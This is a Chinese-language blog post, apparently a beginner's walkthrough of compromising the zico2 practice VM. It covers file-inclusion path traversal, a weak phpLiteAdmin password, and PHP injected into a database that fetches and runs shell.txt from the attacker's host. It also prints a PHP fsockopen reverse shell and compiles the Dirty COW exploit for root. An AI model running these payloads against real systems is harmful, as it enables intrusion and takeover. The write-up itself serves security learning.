<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>zico2靶机实验 | 雨墨旅</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>zico2靶机实验</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-10T16:00:00.000Z" id="date"> 2023-09-11</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-18T07:14:24.347Z" id="updated"> 2023-09-18</time></div></span></div></div><hr><div id="post-content"><h2 id="一实验环境"><a href="#一实验环境" class="headerlink" title="一实验环境"></a>一实验环境</h2><p>靶机：zico2，IP地址暂时未知；</p>
<p>测试机：kali，IP地址：192.168.43.140；</p>
<h2 id="二实验流程"><a href="#二实验流程" class="headerlink" title="二实验流程"></a>二实验流程</h2><p>信息收集——主机发现</p>
<p>信息收集——端口扫描</p>
<p>渗透测试</p>
<h2 id="三实验步骤"><a href="#三实验步骤" class="headerlink" title="三实验步骤"></a>三实验步骤</h2><h3 id="3-1信息收集——主机发现"><a href="#3-1信息收集——主机发现" class="headerlink" title="3.1信息收集——主机发现"></a>3.1信息收集——主机发现</h3><h5 id="3-1-1扫描主机（nerdiscover）"><a href="#3-1-1扫描主机（nerdiscover）" class="headerlink" title="3.1.1扫描主机（nerdiscover）"></a>3.1.1扫描主机（nerdiscover）</h5><p><code>-i 指定网卡 -r指定网段</code></p>
<p><code>sudo netdiscover -i eth0 -r 192.168.43.0/24</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907220414645.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907220414645.png" alt="image-20230907220414645"></p>
<p>对方主机应该是 <strong>192.168.43.143</strong></p>
<h3 id="3-2信息收集——端口扫描"><a href="#3-2信息收集——端口扫描" class="headerlink" title="3.2信息收集——端口扫描"></a>3.2信息收集——端口扫描</h3><h5 id="3-2-1扫描端口（masscan）"><a href="#3-2-1扫描端口（masscan）" class="headerlink" title="3.2.1扫描端口（masscan）"></a>3.2.1扫描端口（masscan）</h5><p><code>sudo masscan --rate=10000 --ports 0-65535 192.168.43.143</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907220458927.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907220458927.png" alt="image-20230907220458927"></p>
<p>目标机器开放了111，22，34560端口</p>
<h5 id="3-2-2详细端口扫描（namp）"><a href="#3-2-2详细端口扫描（namp）" class="headerlink" title="3.2.2详细端口扫描（namp）"></a>3.2.2详细端口扫描（namp）</h5><p><code>sudo nmap 192.168.43.143 -sV -T4 -O -p 111,34560,22</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907220816250.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907220816250.png" alt="image-20230907220816250"></p>
<p><code>22 ssh；111 rpcbind；34560 status</code></p>
<h3 id="3-3渗透测试"><a href="#3-3渗透测试" class="headerlink" title="3.3渗透测试"></a>3.3渗透测试</h3><h5 id="3-3-1访问对方http信息"><a href="#3-3-1访问对方http信息" class="headerlink" title="3.3.1访问对方http信息"></a>3.3.1访问对方http信息</h5><p>通过查看页面寻找有用信息</p>
<p><code>?page=</code>    猜测可能有文件包含漏洞</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907222909843.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907222909843.png" alt="image-20230907222909843"></p>
<p>直接将page后的内容修改无法查看到&#x2F;etc&#x2F;passwd的内容</p>
<p>查看到<code>../../../../etc/passwd</code>内容</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223049155.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223049155.png" alt="image-20230907223049155"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">该网站存在文件包含漏洞；<br>如果不能直接查看到/etc/passwd下的内容，可能是因为默认的目录没有在根目录下，可以采用../../../../的方式，使其返回到根目录下；<br>了解到该网站存在文件包含的漏洞，接下来就需要去寻找网站可以访问的目录，利用文件包含漏洞；<br></code></pre></td></tr></table></figure>



<h5 id="3-3-2目录扫描（dirb）"><a href="#3-3-2目录扫描（dirb）" class="headerlink" title="3.3.2目录扫描（dirb）"></a>3.3.2目录扫描（dirb）</h5><p><code>sudo dirb http://192.168.43.143</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223408772.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223408772.png" alt="image-20230907223408772"></p>
<p>可以查看到<code>/css/;/dbamin/;/img/;/js/;/vendor/</code>等目录</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223442715.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223442715.png" alt="image-20230907223442715"></p>
<h5 id="3-3-3查看访问到的目录"><a href="#3-3-3查看访问到的目录" class="headerlink" title="3.3.3查看访问到的目录"></a>3.3.3查看访问到的目录</h5><p>访问该页面下的<code>test_db.php</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223722275.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907223722275.png" alt="image-20230907223722275"></p>
<p>进入数据库测试页面,通过页面显示可以获取一些信息phpLiteAdmin的版本</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232126598.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232126598.png" alt="image-20230907232126598"></p>
<p>查询phpLiteAdmin对应版本漏洞</p>
<p><code>searchsploit phpLiteAdmin</code></p>
<p>查询到1.9.3版本有远程注入漏洞</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232320029.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232320029.png" alt="image-20230907232320029"></p>
<p>尝试登录数据库</p>
<p><code>admin</code>弱口令尝试登陆成功</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232422797.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232422797.png" alt="image-20230907232422797"></p>
<h5 id="3-3-4查看数据库敏感信息"><a href="#3-3-4查看数据库敏感信息" class="headerlink" title="3.3.4查看数据库敏感信息"></a>3.3.4查看数据库敏感信息</h5><p>得到两个账号的登录密码</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232550551.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232550551.png" alt="image-20230907232550551"></p>
<p>用在线md5碰撞尝试找到密码</p>
<p><code>root——34kroot34</code></p>
<p><code>zico——zico2215@</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232728287.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232728287.png" alt="image-20230907232728287"></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232827687.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230907232827687.png" alt="image-20230907232827687"></p>
<h5 id="3-3-5尝试ssh远程链接"><a href="#3-3-5尝试ssh远程链接" class="headerlink" title="3.3.5尝试ssh远程链接"></a>3.3.5尝试ssh远程链接</h5><p>两个用户都无法链接成功</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911123016712.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911123016712.png" alt="image-20230911123016712"></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911123137957.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911123137957.png" alt="image-20230911123137957"></p>
<h5 id="3-3-6-1命令注入漏洞和文件包含漏洞的利用的测试"><a href="#3-3-6-1命令注入漏洞和文件包含漏洞的利用的测试" class="headerlink" title="3.3.6.1命令注入漏洞和文件包含漏洞的利用的测试"></a>3.3.6.1命令注入漏洞和文件包含漏洞的利用的测试</h5><p>创建数据库test_db；创建彪test_table</p>
<p>写入信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">测试代码<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>()<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911145505217.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911145505217.png" alt="image-20230911145505217"></p>
<p>进行访问phpinfo()的测试</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911145920520.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911145920520.png" alt="image-20230911145920520"></p>
<h5 id="3-3-6-2命令注入漏洞和文件包含漏洞的利用"><a href="#3-3-6-2命令注入漏洞和文件包含漏洞的利用" class="headerlink" title="3.3.6.2命令注入漏洞和文件包含漏洞的利用"></a>3.3.6.2命令注入漏洞和文件包含漏洞的利用</h5><p>创立一个test数据库；创立一个shell的表；</p>
<p>添加数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">数据库内容<br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;wget 192.168.43.140/shell.txt -O /tmp/shell.php;</span><br><span class="hljs-string">    php /tmp/shell.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">#通过system()命令执行wget命令将kali上的shell.txt文件保存到指定目录下的shell.php</span><br>    <span class="hljs-comment">#执行保存下的shell.php</span><br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911150729271.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911150729271.png" alt="image-20230911150729271"></p>
<p>在kali上写一个shell.txt保存在&#x2F;var&#x2F;www&#x2F;html中</p>
<p>执行apache2让靶机可以下载shell.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">shell.txt<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$sock</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">&quot;192.168.43.140&quot;</span>,<span class="hljs-number">1234</span>);<br>	<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>	<span class="hljs-comment">#fsockopen()与192.168.43.140:1234建立一个链接</span><br>	<span class="hljs-comment">#exec()通过&#x27;/bin/sh -i&#x27;启动一个交互式的shell</span><br>    <span class="hljs-comment">#‘&lt;&amp;3’&#x27;&gt;&amp;3&#x27;&#x27;2&gt;&amp;3&#x27;三个分别输入、输出和错误流定位到远程链接上</span><br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911152200821.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911152200821.png" alt="image-20230911152200821"></p>
<p>监听端口1234</p>
<p><code>sudo nc -nvlp 1234</code></p>
<p>开启监听后访问<code>192.168.43.143/view.php?page=../../../../usr/databases/test</code></p>
<p>访问后执行数据库中的命令</p>
<p>whoami可以看到当前用户是www-data，当前所在的目录是&#x2F;var&#x2F;www，linux内核是3.2.0</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911152216365.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911152216365.png" alt="image-20230911152216365"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">执行命令<br>python -c &#x27;import pty;<br>pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>#通过pty产生一个新的bash shell<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911152530270.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911152530270.png" alt="image-20230911152530270"></p>
<h5 id="3-3-7脏牛提权"><a href="#3-3-7脏牛提权" class="headerlink" title="3.3.7脏牛提权"></a>3.3.7脏牛提权</h5><p><code>sudo searchspoit linux cow</code></p>
<p>查找脏牛提权脚本</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911205212233.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911205212233.png" alt="image-20230911205212233"></p>
<p>将提权脚本移到http服务的目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">linux执行命令<br>cd /usr/share/exploitdb/exploits/linux/local<br>sudo cp 40839.c /var/www/html<br>cd /var/www/html<br>mv 40839.c dirty.c<br>sudo python -m http.server 8080<br></code></pre></td></tr></table></figure>

<p>操控靶机下载编译并执行提权脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">linux执行命令<br>wget 192.168.43.140:8080/dirty.c<br>gcc -pthread dirty.c -o exo -lcrypt<br>./exp<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911154838672.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911154838672.png" alt="image-20230911154838672"></p>
<p>执行提权脚本</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911162442120.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911162442120.png" alt="image-20230911162442120"></p>
<p>进入特权模式</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911162636715-16944207972791.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911162636715-16944207972791.png" alt="image-20230911162636715"></p>
<p>访问&#x2F;etc&#x2F;passwd查看</p>
<p>root用户被firefart替代</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911162831568.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911162831568.png" alt="image-20230911162831568"></p>
<h5 id="3-3-8查看其他用户的文件"><a href="#3-3-8查看其他用户的文件" class="headerlink" title="3.3.8查看其他用户的文件"></a>3.3.8查看其他用户的文件</h5><p>发现zico用户下的网站管理系统</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184422484.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184422484.png" alt="image-20230911184422484"></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184133269.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184133269.png" alt="image-20230911184133269"></p>
<p>wp-config.php 文件是WordPress数据库的关键。数据库名、用户名、密码、位置都是在此设置。</p>
<p>查看wp-config.php文件</p>
<p>通过查看wp-config.php文件获取到用户名和密码</p>
<p><code>zico  sWfCsfJSPV9H3AmQzw8</code></p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184358373.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184358373.png" alt="image-20230911184358373"></p>
<p>尝试进行ssh远程链接</p>
<p class='item-img' data-src='/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184652821.png'><img src="/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/image-20230911184652821.png" alt="image-20230911184652821"></p>
<p>成功登录</p>
<h2 id="四实验总结"><a href="#四实验总结" class="headerlink" title="四实验总结"></a>四实验总结</h2><p>如果看到页面可能存在文件包含漏洞，可以使用..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd的方式去尝试；</p>
<p>当渗透进系统时，可以查看其它用户的家目录下有什么可以利用的信息；</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>感谢<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38684504/article/details/90105790">靶机渗透测试实战（六）——Zico2渗透实战_橘子女侠的博客-CSDN博客</a>的博客让我一个新手小白能够从头打靶到最后。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/11/Seattle%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/">← Next Seattle靶机实验</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/28/%E5%AF%BC%E5%87%BA%E8%A1%A8/">导出表 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Rain_ink_trip</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">一实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%AE%9E%E9%AA%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">二实验流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.</span> <span class="toc-text">三实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">3.1.</span> <span class="toc-text">3.1信息收集——主机发现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-1%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%EF%BC%88nerdiscover%EF%BC%89"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">3.1.1扫描主机（nerdiscover）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.</span> <span class="toc-text">3.2信息收集——端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%EF%BC%88masscan%EF%BC%89"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">3.2.1扫描端口（masscan）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-2%E8%AF%A6%E7%BB%86%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%88namp%EF%BC%89"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">3.2.2详细端口扫描（namp）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">3.3渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-1%E8%AE%BF%E9%97%AE%E5%AF%B9%E6%96%B9http%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.0.1.</span> <span class="toc-text">3.3.1访问对方http信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-2%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%88dirb%EF%BC%89"><span class="toc-number">3.3.0.2.</span> <span class="toc-text">3.3.2目录扫描（dirb）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-3%E6%9F%A5%E7%9C%8B%E8%AE%BF%E9%97%AE%E5%88%B0%E7%9A%84%E7%9B%AE%E5%BD%95"><span class="toc-number">3.3.0.3.</span> <span class="toc-text">3.3.3查看访问到的目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-4%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.0.4.</span> <span class="toc-text">3.3.4查看数据库敏感信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-5%E5%B0%9D%E8%AF%95ssh%E8%BF%9C%E7%A8%8B%E9%93%BE%E6%8E%A5"><span class="toc-number">3.3.0.5.</span> <span class="toc-text">3.3.5尝试ssh远程链接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-6-1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E7%9A%84%E6%B5%8B%E8%AF%95"><span class="toc-number">3.3.0.6.</span> <span class="toc-text">3.3.6.1命令注入漏洞和文件包含漏洞的利用的测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-6-2%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.0.7.</span> <span class="toc-text">3.3.6.2命令注入漏洞和文件包含漏洞的利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-7%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.0.8.</span> <span class="toc-text">3.3.7脏牛提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-8%E6%9F%A5%E7%9C%8B%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.0.9.</span> <span class="toc-text">3.3.8查看其他用户的文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">四实验总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">5.</span> <span class="toc-text">最后</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="//js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
